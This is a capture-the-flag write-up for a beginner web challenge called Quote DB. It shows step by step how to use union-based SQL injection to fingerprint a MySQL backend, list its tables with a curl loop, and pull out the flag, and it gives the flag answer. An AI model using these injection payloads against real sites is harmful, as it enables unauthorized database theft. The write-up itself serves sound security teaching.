# Challenge #14 - Quote DB

Category: `web`

## Story

>You don’t manage to disarm the guard, he is quicker than you are. He knocks you out, and when you wake up you’re inside a prison cell, but it doesn’t seem like you’re on a boat anymore, you must be inside the headquarters on the secret island! The cell is claustrophobic, with rusty iron bars and a bed of concrete.<br/><br/>
>In this challenge, you have to find the hidden flag. Good luck!

## Solution

This challenge comes with a URL: https://quotedb-web.2021.ctfcompetition.com/

Let's visit it and see what we're dealing with.

![The Quote DB homepage](quotedb_homepage.png)

There's practically nothing going on here. There's a quote and an author. There's no way to enter new quotes. Trying various subpages like "/admin" or "/add_quote" and variations also turns up nothing. There's no JavaScript, either included or embedded in the page source.

One cool thing you can do is use a website or extension like [BuiltWith](https://builtwith.com/) or [Wappalyzer](https://www.wappalyzer.com/) to profile the website and see what technologies it's using. In this case though, all we find is that the website uses Ubuntu, Apache, GCP and some kind of CDN. No hint on whether there's a database or what kind if so.

### Looking for SQL injection

The only piece of interactivity is this:

```
If you'd like to return to this quote, just click here.
```

That shows us that the page supports an `id` parameter, like `/?id=2`. Maybe this can be exploited for [SQL injection](https://portswigger.net/web-security/sql-injection)?

Let's try a few things:

```
/?id=-1
Quote not found

/?id=1023821083902112038013122103810923821
Quote not found
```

No integer mis-parsing yet.

```
/?id=abcdefg
```

This is different. It responds with HTTP status 500 and an empty body. Maybe the id isn't properly escaped after all.

```
/?id=' OR 1=1
```

Same. Empty response and HTTP status 500. But no database dump, sadly.

```
/?id=1--
"If you want total security, go to prison. There you're fed, clothed, given medical care and so on. The only thing lacking... is freedom." - Dwight D. Eisenhower
```

Strangely, this appears to work, and returns quote 1.

What about this? *(I just guessed that the table is called "quotes")*

```
/?id=1 UNION SELECT * FROM quotes
If you want total security, go to prison. There you're fed, clothed, given medical care and so on. The only thing lacking... is freedom." - Dwight D. Eisenhower
```

Oh! This isn't sanitized away! However, it returns the first quote, presumably because it selects the top result from the query. Let's verify this by using a nonexistent quote id but still selecting from the `quotes` table:

```
/?id=77 UNION SELECT * FROM quotes
"If you want total security, go to prison. There you're fed, clothed, given medical care and so on. The only thing lacking... is freedom." - Dwight D. Eisenhower
```

It works! It returns the first quote, presumably because the main query was something like this

```sql
SELECT *
FROM quotes
WHERE id = <id>
```

And we turned it into

```sql
SELECT *
FROM quotes
WHERE id = 77 UNION SELECT * FROM quotes
```

### Looking for the flag

Now what? We can already look up any row in the `quotes` table. Enumerating it doesn't find anything.

Maybe the flag is in another table. But how do we find out what tables are out there?

It's [possible](https://www.sqltutorial.org/sql-list-all-tables/) in some engines to directly query metadata tables. We don't know exactly what DB this website is using, but let's try a few known metadata table names.

Before we do so though, we need to determine how many columns are in the quotes database. We can't just `SELECT *` from arbitrary tables or the `UNION` would fail as it can't match up the rows. This is pretty simple to do though - just try selecting static values and increasing the number until we get a success.

```
/?id=77 UNION SELECT 1
HTTP Status 500

/?id=77 UNION SELECT 1,2
HTTP Status 500

/?id=77 UNION SELECT 1,2,3
HTTP Status 200
```

That was quick. There are 3 columns, probably the id, quote and author.

Next, let's look for the existence of metadata tables:

```
/?id=77 UNION SELECT 1,2,3 FROM user_tables
HTTP Status 500

/?id=77 UNION SELECT 1,2,3 FROM dba_tables
HTTP Status 500

/?id=77 UNION SELECT 1,2,3 FROM all_tables
HTTP Status 500

/?id=77 UNION SELECT 1,2,3 FROM information_schema.tables
HTTP Status 200
```

Interesting! That tells us we're dealing with [MySQL](https://www.mysql.com/). Now let's try to select some rows from it. You can Google and find [the docs](https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/information-schema-tables-table.html) which describe the available columns.

```
/?id=77 UNION SELECT TABLE_CATALOG,TABLE_NAME,TABLE_TYPE FROM information_schema.tables
"ALL_PLUGINS" - SYSTEM VIEW
```

Okay, not too helpful. We only get the top row so we need some way of selecting a specific row.

Googling "mysql select specific row" leads to [this StackOverflow answer](https://stackoverflow.com/a/10457494) which explains that the `LIMIT` clause allows specifying an offset. Let's try it.

```
/?id=77 UNION SELECT TABLE_CATALOG,TABLE_NAME,TABLE_TYPE FROM information_schema.tables LIMIT 2,1
"CHARACTER_SETS" - SYSTEM VIEW

/?id=77 UNION SELECT TABLE_CATALOG,TABLE_NAME,TABLE_TYPE FROM information_schema.tables LIMIT 3,1
"CHECK_CONSTRAINTS" - SYSTEM VIEW
```

Cool! It works! Let's quickly enumerate all the tables (see [enumerate_tables.sh](enumerate_tables.sh)):

```sh
#!/usr/bin/env bash

for i in {1..1000}; do
  curl -s 'https://quotedb-web.2021.ctfcompetition.com/?id=77%20UNION%20SELECT%20TABLE_CATALOG,TABLE_NAME,TABLE_TYPE%20FROM%20information_schema.tables%20LIMIT%20'${i}',1' | grep '    "' | grep -o '".*"'
done
```

This takes a while, but it eventually finds us two key tables:

```sh
$ ./enumerate_tables.sh
...
"flag"
"quotes"
^C
```

### Extracting the flag

We don't know exactly how many columns are in the `flag` table but let's just try getting them all:

```
/?id=77 UNION SELECT * FROM flag
HTTP Status 500
```

Oops. Let's try adding more columns.

```
/?id=77 UNION SELECT *,0 FROM flag
HTTP Status 200
```

That succeeds and gives us the flag.

```
CTF{little_bobby_tables_we_call_him}
```








